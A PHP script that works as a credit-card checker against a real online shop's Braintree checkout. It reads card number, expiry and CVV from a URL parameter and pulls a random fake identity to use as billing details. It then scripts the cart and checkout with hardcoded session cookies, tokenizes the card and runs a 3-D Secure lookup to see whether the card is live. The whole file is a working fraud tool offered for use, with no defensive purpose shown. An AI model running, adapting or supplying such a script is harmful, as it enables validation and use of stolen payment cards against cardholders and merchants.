<?php
$card = $_GET['card'];

$ccinfo = explode("|", $card);
$cc = $ccinfo[0];
$mm = $ccinfo[1];
$year = $ccinfo[2];
$cvv = $ccinfo[3];

#################[ User Rand ]#################
    $get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $location_state = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $post = $matches1[1][0];

    if ($location_state == "Alabama") {
        $state = "AL";
    } else if ($location_state == "alaska") {
        $state = "AK";
    } else if ($location_state == "arizona") {
        $state = "AR";
    } else if ($location_state == "california") {
        $state = "CA";
    } else if ($location_state == "colorado") {
        $state = "CO";
    } else if ($location_state == "connecticut") {
        $state = "CT";
    } else if ($location_state == "delaware") {
        $state = "DE";
    } else if ($location_state == "district of columbia") {
        $state = "DC";
    } else if ($location_state == "florida") {
        $state = "FL";
    } else if ($location_state == "georgia") {
        $state = "GA";
    } else if ($location_state == "hawaii") {
        $state = "HI";
    } else if ($location_state == "idaho") {
        $state = "ID";
    } else if ($location_state == "illinois") {
        $state = "IL";
    } else if ($location_state == "indiana") {
        $state = "IN";
    } else if ($location_state == "iowa") {
        $state = "IA";
    } else if ($location_state == "kansas") {
        $state = "KS";
    } else if ($location_state == "kentucky") {
        $state = "KY";
    } else if ($location_state == "louisiana") {
        $state = "LA";
    } else if ($location_state == "maine") {
        $state = "ME";
    } else if ($location_state == "maryland") {
        $state = "MD";
    } else if ($location_state == "massachusetts") {
        $state = "MA";
    } else if ($location_state == "michigan") {
        $state = "MI";
    } else if ($location_state == "minnesota") {
        $state = "MN";
    } else if ($location_state == "mississippi") {
        $state = "MS";
    } else if ($location_state == "missouri") {
        $state = "MO";
    } else if ($location_state == "montana") {
        $state = "MT";
    } else if ($location_state == "nebraska") {
        $state = "NE";
    } else if ($location_state == "nevada") {
        $state = "NV";
    } else if ($location_state == "new hampshire") {
        $state = "NH";
    } else if ($location_state == "new jersey") {
        $state = "NJ";
    } else if ($location_state == "new mexico") {
        $state = "NM";
    } else if ($location_state == "new york") {
        $state = "LA";
    } else if ($location_state == "north carolina") {
        $state = "NC";
    } else if ($location_state == "north dakota") {
        $state = "ND";
    } else if ($location_state == "Ohio") {
        $state = "OH";
    } else if ($location_state == "oklahoma") {
        $state = "OK";
    } else if ($location_state == "oregon") {
        $state = "OR";
    } else if ($location_state == "pennsylvania") {
        $state = "PA";
    } else if ($location_state == "rhode Island") {
        $state = "RI";
    } else if ($location_state == "south carolina") {
        $state = "SC";
    } else if ($location_state == "south dakota") {
        $state = "SD";
    } else if ($location_state == "tennessee") {
        $state = "TN";
    } else if ($location_state == "texas") {
        $state = "TX";
    } else if ($location_state == "utah") {
        $state = "UT";
    } else if ($location_state == "vermont") {
        $state = "VT";
    } else if ($location_state == "virginia") {
        $state = "VA";
    } else if ($location_state == "washington") {
        $state = "WA";
    } else if ($location_state == "west virginia") {
        $state = "WV";
    } else if ($location_state == "wisconsin") {
        $state = "WI";
    } else if ($location_state == "wyoming") {
        $state = "WY";
    } else {
        $state = "KY";
    }

$rand = rand(1111111,9999999);
#################[ REQS ]#################
$ch = curl_init('https://zwillingbeauty.com/nagelfeile-keramik-weiss-88402-151-0.html');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: zwillingbeauty.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://zwillingbeauty.com/';
$headers[] = 'Cookie: ABTastySession=mrasn=&lp=https%253A%252F%252Fzwillingbeauty.com%252F&sen=2; ABTasty=uid=vvqbrpx2b0zgtxje&fst=1621046746232&pst=-1&cst=1621046746232&ns=1&pvt=2&pvis=2&th=; OptanonConsent=isIABGlobal=false&datestamp=Sat+May+15+2021+10%3A46%3A17+GMT%2B0800+(Philippine+Standard+Time)&version=6.13.0&hosts=&consentId=d744dbb5-4ca3-408d-be42-7a68d16e3f45&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0%2CC0003%3A0&geolocation=%3B&AwaitingReconsent=false; OptanonAlertBoxClosed=2021-05-15T02:45:58.065Z; form_key=RNiJZhGptzv69PfN; mage-banners-cache-storage=%7B%7D; _gcl_au=1.1.1025039122.1621046764; PHPSESSID=c4cc8912a0175962fbeaf4788aec342d; form_key=RNiJZhGptzv69PfN; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$curl = curl_exec($ch);

##################################
$ch = curl_init('https://zwillingbeauty.com/checkout/cart/add/uenc/aHR0cHM6Ly96d2lsbGluZ2JlYXV0eS5jb20vbmFnZWxmZWlsZS1rZXJhbWlrLXdlaXNzLTg4NDAyLTE1MS0wLmh0bWw%2C/product/1787/');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: zwillingbeauty.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: multipart/form-data; boundary=---------------------------116685149327933813442064125864';
$headers[] = 'Referer: https://zwillingbeauty.com/nagelfeile-keramik-weiss-88402-151-0.html';
$headers[] = 'Cookie: ABTastySession=mrasn=&lp=https%253A%252F%252Fzwillingbeauty.com%252F&sen=3; ABTasty=uid=vvqbrpx2b0zgtxje&fst=1621046746232&pst=-1&cst=1621046746232&ns=1&pvt=3&pvis=3&th=; OptanonConsent=isIABGlobal=false&datestamp=Sat+May+15+2021+10%3A46%3A58+GMT%2B0800+(Philippine+Standard+Time)&version=6.13.0&hosts=&consentId=d744dbb5-4ca3-408d-be42-7a68d16e3f45&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0%2CC0003%3A0&geolocation=%3B&AwaitingReconsent=false; OptanonAlertBoxClosed=2021-05-15T02:45:58.065Z; form_key=RNiJZhGptzv69PfN; mage-banners-cache-storage=%7B%7D; _gcl_au=1.1.1025039122.1621046764; PHPSESSID=c4cc8912a0175962fbeaf4788aec342d; form_key=RNiJZhGptzv69PfN; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D';
$postfield = '-----------------------------116685149327933813442064125864
Content-Disposition: form-data; name="product"

1787
-----------------------------116685149327933813442064125864
Content-Disposition: form-data; name="selected_configurable_option"


-----------------------------116685149327933813442064125864
Content-Disposition: form-data; name="related_product"


-----------------------------116685149327933813442064125864
Content-Disposition: form-data; name="item"

1787
-----------------------------116685149327933813442064125864
Content-Disposition: form-data; name="form_key"

RNiJZhGptzv69PfN
-----------------------------116685149327933813442064125864
Content-Disposition: form-data; name="qty"

1
-----------------------------116685149327933813442064125864--';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl2 = curl_exec($ch);
##################################
$ch = curl_init('https://zwillingbeauty.com/checkout/cart/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: zwillingbeauty.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://zwillingbeauty.com/nagelfeile-keramik-weiss-88402-151-0.html';
$headers[] = 'Cookie: ABTastySession=mrasn=&lp=https%253A%252F%252Fzwillingbeauty.com%252F&sen=3; ABTasty=uid=vvqbrpx2b0zgtxje&fst=1621046746232&pst=-1&cst=1621046746232&ns=1&pvt=3&pvis=3&th=; OptanonConsent=isIABGlobal=false&datestamp=Sat+May+15+2021+10%3A46%3A58+GMT%2B0800+(Philippine+Standard+Time)&version=6.13.0&hosts=&consentId=d744dbb5-4ca3-408d-be42-7a68d16e3f45&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0%2CC0003%3A0&geolocation=%3B&AwaitingReconsent=false; OptanonAlertBoxClosed=2021-05-15T02:45:58.065Z; form_key=RNiJZhGptzv69PfN; mage-banners-cache-storage=%7B%7D; _gcl_au=1.1.1025039122.1621046764; PHPSESSID=c4cc8912a0175962fbeaf4788aec342d; form_key=RNiJZhGptzv69PfN; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=603925674e5083b448991e2dc25a27e0; section_data_ids=%7B%22cart%22%3A1621046913%2C%22directory-data%22%3A1621046913%2C%22ammessages%22%3A1621046913%2C%22signifyd-fingerprint%22%3A1621046913%7D';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$curl3 = curl_exec($ch);

##################################
$ch = curl_init('https://zwillingbeauty.com/checkout/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: zwillingbeauty.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://zwillingbeauty.com/checkout/cart/';
$headers[] = 'Cookie: ABTastySession=mrasn=&lp=https%253A%252F%252Fzwillingbeauty.com%252F&sen=4; ABTasty=uid=vvqbrpx2b0zgtxje&fst=1621046746232&pst=-1&cst=1621046746232&ns=1&pvt=4&pvis=4&th=; OptanonConsent=isIABGlobal=false&datestamp=Sat+May+15+2021+10%3A55%3A55+GMT%2B0800+(Philippine+Standard+Time)&version=6.13.0&hosts=&consentId=d744dbb5-4ca3-408d-be42-7a68d16e3f45&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0%2CC0003%3A0&geolocation=%3B&AwaitingReconsent=false; OptanonAlertBoxClosed=2021-05-15T02:45:58.065Z; form_key=RNiJZhGptzv69PfN; mage-banners-cache-storage=%7B%7D; _gcl_au=1.1.1025039122.1621046764; PHPSESSID=c4cc8912a0175962fbeaf4788aec342d; form_key=RNiJZhGptzv69PfN; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=05354a05a5d35ed266e39de768c7c397; section_data_ids=%7B%22cart%22%3A1621047369%2C%22directory-data%22%3A1621046913%2C%22ammessages%22%3A1621046913%2C%22signifyd-fingerprint%22%3A1621046913%7D; dhl_shipping_data_storage=%7B%7D';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$curl4 = curl_exec($ch);

$getbearer = base64_decode(t(st(g($curl4, 'clientToken":"','"'))));
$bearer = t(st(g($getbearer,'"authorizationFingerprint":"','"')));

##################################
                                    
$ch = curl_init('https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$bearer;
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$postfield = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"08ef5a84-7c20-4b67-bf87-3e11fb1f8d3e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$year.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl5 = curl_exec($ch);

$token = t(st(g($curl5, '"token":"','"')));
##################################
$ch = curl_init('https://api.braintreegateway.com/merchants/84hhwhj9h98g5p98/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://zwillingbeauty.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://zwillingbeauty.com/';
$postfield = '{"amount":"53.85","additionalInfo":{"billingLine1":"'.$street.'","billingCity":"'.$city.'","billingState":"'.$location_state.'","billingPostalCode":"'.$post.'","billingCountryCode":"DE","billingPhoneNumber":"'.$phone.'","billingGivenName":"'.$first.'","billingSurname":"'.$last.'"},"dfReferenceId":"0_968ce143-ef0b-4300-a723-7f859884422b","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.63.0","cardinalDeviceDataCollectionTimeElapsed":342},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.63.0","_meta":{"merchantAppId":"zwillingbeauty.com","platform":"web","sdkVersion":"3.63.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"08ef5a84-7c20-4b67-bf87-3e11fb1f8d3e"}}';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl6 = curl_exec($ch);

echo $curl6;
function g($string, $start, $end) {
 return explode($end, explode($start, $string)[1])[0];
}
function st($string) {
 return strip_tags($string);
}
function t($string){
 return trim($string);
}
?>